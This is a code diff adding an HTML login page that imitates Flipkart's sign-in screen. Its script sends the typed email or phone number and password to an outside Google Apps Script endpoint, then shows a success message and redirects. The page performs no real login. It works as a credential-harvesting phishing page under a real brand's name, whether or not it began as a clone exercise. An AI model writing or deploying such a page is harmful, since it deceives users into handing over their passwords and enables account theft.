@@ -1,0 +1,62 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="login.css">
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+
+    <div class="container">
+        <div class="row login-container">
+          <div class="col-md-6 d-flex align-items-center">
+            <div class="login-left">
+              <h2>Welcome to Flipkart</h2>
+              <p>Login to get access to your Orders, Wishlist and Recommendations</p>
+              <img src="images/login.png" alt="Image" class="img-fluid mt-3">
+            </div>
+          </div>
+          <div class="col-md-6 d-flex align-items-center">
+            <div class="login-right">
+              <h2>Login</h2>
+              <form id="submit-form">
+                <div class="form-group">
+                  <label for="email">Enter Email/Mobile number</label>
+                  <input type="email" class="form-control" name="email" id="email" placeholder="Enter email">
+                </div>
+                <div class="form-group">
+                  <label for="password">Password</label>
+                  <input type="password" class="form-control" name="password" id="password" placeholder="Password">
+                </div>
+                <div class="form-group form-check">
+                  <input type="checkbox" name="checkbox" class="form-check-input" id="rememberMe">
+                  <label class="form-check-label" for="rememberMe">Remember me</label>
+                </div>
+                <button type="submit" class="btn btn-primary">Login</button>
+              </form>
+              <p class="mt-3 tems" >By continuing, you agree to Flipkart's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
+            </div>
+          </div>
+        </div>
+    </div>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbxFAP6LmtrucO1PEaSB4GI5x4XemRGoEMBV7iTX9x7U0HtqfyV6sd2ukduv-O9GZYE6/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    window.location.href="index.html"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
